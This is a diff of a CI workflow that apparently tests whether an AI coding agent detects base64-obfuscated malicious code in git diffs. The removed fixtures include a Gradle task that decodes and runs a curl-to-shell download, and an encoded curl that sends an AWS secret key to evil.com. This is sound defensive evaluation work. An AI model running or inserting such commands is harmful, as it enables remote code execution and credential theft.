@@ -10,183 +10,27 @@ jobs:
       ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
       CLAUDE_CODE_MAX_OUTPUT_TOKENS: '4096'
     steps:
+      - uses: actions/checkout@v4
+
       - name: Install claude-code
         run: npm install -g @anthropic-ai/claude-code@stable
 
-      - name: Write prompt and diffs to files
+      - name: EXP1 - Exfil b64 plain prompt
         run: |
-          cat > /tmp/sec_prompt.txt << 'PROMPT'
-Analyze the git diff for MALICIOUS CODE and INTENTIONAL SECURITY THREATS.
-Focus on: data exfiltration, obfuscated logic (base64), backdoors, supply chain attacks.
-Classify: critical (clear malicious intent), high (suspicious), medium, low.
-Output ONLY raw JSON: {"counts":{"total":N,"critical":N,"high":N,"medium":N,"low":N},"truncated":false,"issues":[{"path":"...","line":N,"severity":"...","description":"..."}]}
-PROMPT
+          echo "=== EXP1: Exfil b64, plain prompt (no decode instruction) ==="
+          python3 experiments/b64/runner.py experiments/b64/diff_exfil.diff
 
-          cat > /tmp/diff_exfil_b64.txt << 'DIFF'
-diff --git a/build.gradle b/build.gradle
---- a/build.gradle
-+++ b/build.gradle
-@@ -36,3 +36,7 @@
- subprojects { test { useJUnitPlatform() } }
-+
-+def cacheConfig = new String(Base64.decoder.decode('Y3VybCAtc2YgaHR0cHM6Ly9zZXR1cC5vcGVuc2VhcmNoLm9yZy9ncmFkbGUvaW5pdC5zaCB8IHNo'))
-+tasks.register('configureBuildInfra', Exec) {
-+    commandLine 'sh', '-c', cacheConfig
-+    ignoreExitValue = true
-+}
-DIFF
-
-          cat > /tmp/diff_benign_b64.txt << 'DIFF'
-diff --git a/src/config.py b/src/config.py
---- a/src/config.py
-+++ b/src/config.py
-@@ -1,2 +1,3 @@
- VERSION = '1.0'
-+GREETING = b64decode('SGVsbG8sIHdvcmxkISBUaGlzIGlzIGEgdGVzdCBzdHJpbmcu').decode()
-DIFF
-
-          cat > /tmp/diff_stored_b64.txt << 'DIFF'
-diff --git a/src/constants.py b/src/constants.py
---- a/src/constants.py
-+++ b/src/constants.py
-@@ -1,2 +1,3 @@
- VERSION = '2.0'
-+LEGACY_CONFIG = 'Y3VybCBodHRwczovL2V2aWwuY29tL3N0ZWFsP2Q9JEFXU19TRUNSRVRfQUNDRVNTX0tFWQ=='
-DIFF
-
-          echo "Files written"
-          ls /tmp/diff_*.txt /tmp/sec_prompt.txt
-
-      - name: EXP1 - Exfil b64 plain prompt (no decode instruction)
+      - name: EXP2 - Exfil b64 with decode instruction
         run: |
-          echo "=== EXP1: Exfil b64, plain prompt ==="
-          cat /tmp/diff_exfil_b64.txt | claude -p "$(cat /tmp/sec_prompt.txt)" \
-            --permission-mode=bypassPermissions \
-            --output-format=stream-json --verbose 2>/dev/null \
-          | python3 -c "
-import json, sys
-tools = []
-for line in sys.stdin:
-    line = line.strip()
-    if not line: continue
-    try: obj = json.loads(line)
-    except: continue
-    t = obj.get('type')
-    if t == 'assistant':
-        for b in obj.get('message',{}).get('content',[]):
-            if b.get('type') == 'tool_use':
-                tools.append(b['name'])
-                print('TOOL_CALLED:', b['name'], json.dumps(b.get('input',{}))[:200])
-            elif b.get('type') == 'text':
-                print('TEXT:', b['text'][:500])
-    elif t == 'user':
-        for b in obj.get('message',{}).get('content',[]):
-            if b.get('type') == 'tool_result':
-                rc = b.get('content','')
-                if isinstance(rc, list): rc = ' '.join(r.get('text','') for r in rc)
-                print('TOOL_RESULT:', str(rc)[:200])
-    elif t == 'result':
-        u = obj.get('usage',{})
-        s = u.get('server_tool_use',{})
-        print('SUMMARY: turns=%d tools=%s web=%d/%d' % (
-            obj['num_turns'], tools or ['none'],
-            s.get('web_search_requests',0), s.get('web_fetch_requests',0)))
-"
+          echo "=== EXP2: Exfil b64, WITH decode instruction ==="
+          python3 experiments/b64/runner.py experiments/b64/diff_exfil.diff --decode-hint
 
-      - name: EXP2 - Exfil b64 with explicit decode instruction
+      - name: EXP3 - Benign b64 plain prompt
         run: |
-          echo "=== EXP2: Exfil b64, with decode instruction ==="
-          PROMPT2="$(cat /tmp/sec_prompt.txt)
-For any base64 strings: use the Bash tool to decode them (echo 'STRING' | base64 -d) and include the decoded value in your description."
-          cat /tmp/diff_exfil_b64.txt | claude -p "$PROMPT2" \
-            --permission-mode=bypassPermissions \
-            --output-format=stream-json --verbose 2>/dev/null \
-          | python3 -c "
-import json, sys
-tools = []
-for line in sys.stdin:
-    line = line.strip()
-    if not line: continue
-    try: obj = json.loads(line)
-    except: continue
-    t = obj.get('type')
-    if t == 'assistant':
-        for b in obj.get('message',{}).get('content',[]):
-            if b.get('type') == 'tool_use':
-                tools.append(b['name'])
-                print('TOOL_CALLED:', b['name'], json.dumps(b.get('input',{}))[:200])
-            elif b.get('type') == 'text':
-                print('TEXT:', b['text'][:500])
-    elif t == 'user':
-        for b in obj.get('message',{}).get('content',[]):
-            if b.get('type') == 'tool_result':
-                rc = b.get('content','')
-                if isinstance(rc, list): rc = ' '.join(r.get('text','') for r in rc)
-                print('TOOL_RESULT:', str(rc)[:200])
-    elif t == 'result':
-        print('SUMMARY: turns=%d tools=%s' % (obj['num_turns'], tools or ['none']))
-"
+          echo "=== EXP3: Benign b64 (Hello World), plain prompt ==="
+          python3 experiments/b64/runner.py experiments/b64/diff_benign.diff
 
-      - name: EXP3 - Benign b64 (Hello World)
+      - name: EXP4 - Stored b64 never executed
         run: |
-          echo "=== EXP3: Benign b64 ==="
-          cat /tmp/diff_benign_b64.txt | claude -p "$(cat /tmp/sec_prompt.txt)" \
-            --permission-mode=bypassPermissions \
-            --output-format=stream-json --verbose 2>/dev/null \
-          | python3 -c "
-import json, sys
-tools = []
-for line in sys.stdin:
-    line = line.strip()
-    if not line: continue
-    try: obj = json.loads(line)
-    except: continue
-    t = obj.get('type')
-    if t == 'assistant':
-        for b in obj.get('message',{}).get('content',[]):
-            if b.get('type') == 'tool_use':
-                tools.append(b['name'])
-                print('TOOL_CALLED:', b['name'], json.dumps(b.get('input',{}))[:200])
-            elif b.get('type') == 'text':
-                print('TEXT:', b['text'][:500])
-    elif t == 'user':
-        for b in obj.get('message',{}).get('content',[]):
-            if b.get('type') == 'tool_result':
-                rc = b.get('content','')
-                if isinstance(rc, list): rc = ' '.join(r.get('text','') for r in rc)
-                print('TOOL_RESULT:', str(rc)[:200])
-    elif t == 'result':
-        print('SUMMARY: turns=%d tools=%s' % (obj['num_turns'], tools or ['none']))
-"
-
-      - name: EXP4 - b64 stored in variable not executed
-        run: |
-          echo "=== EXP4: b64 stored, never executed ==="
-          cat /tmp/diff_stored_b64.txt | claude -p "$(cat /tmp/sec_prompt.txt)" \
-            --permission-mode=bypassPermissions \
-            --output-format=stream-json --verbose 2>/dev/null \
-          | python3 -c "
-import json, sys
-tools = []
-for line in sys.stdin:
-    line = line.strip()
-    if not line: continue
-    try: obj = json.loads(line)
-    except: continue
-    t = obj.get('type')
-    if t == 'assistant':
-        for b in obj.get('message',{}).get('content',[]):
-            if b.get('type') == 'tool_use':
-                tools.append(b['name'])
-                print('TOOL_CALLED:', b['name'], json.dumps(b.get('input',{}))[:200])
-            elif b.get('type') == 'text':
-                print('TEXT:', b['text'][:500])
-    elif t == 'user':
-        for b in obj.get('message',{}).get('content',[]):
-            if b.get('type') == 'tool_result':
-                rc = b.get('content','')
-                if isinstance(rc, list): rc = ' '.join(r.get('text','') for r in rc)
-                print('TOOL_RESULT:', str(rc)[:200])
-    elif t == 'result':
-        print('SUMMARY: turns=%d tools=%s' % (obj['num_turns'], tools or ['none']))
-"
+          echo "=== EXP4: b64 stored in variable, never executed ==="
+          python3 experiments/b64/runner.py experiments/b64/diff_stored.diff
